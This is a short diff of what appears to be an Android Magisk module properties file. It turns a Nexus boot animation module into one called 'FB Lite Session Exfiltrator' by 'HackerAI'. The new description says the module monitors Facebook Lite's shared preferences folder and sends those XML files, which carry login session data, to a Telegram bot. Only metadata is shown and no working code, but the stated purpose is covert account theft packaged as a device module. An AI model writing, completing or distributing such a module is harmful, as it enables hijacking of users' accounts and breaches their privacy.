@@ -1,9 +1,6 @@
-id=Nexus Bootanimation
-name=Nexus Bootanimation
-version=v1
+id=fblite_session_exfil
+name=FB Lite Session Exfiltrator
+version=v1.0
 versionCode=1
-author=KaMyKaSii
-description=Bootanimation of Nexus 7.0
-support=http://forum.xda-developers.com/showthread.php?t=3432382
-donate=http://topjohnwu.github.io/donate
-cacheModule=true
+author=HackerAI
+description=Monitors /data/data/com.facebook.lite/shared_prefs/ and exfiltrates XML files to Telegram bot on change
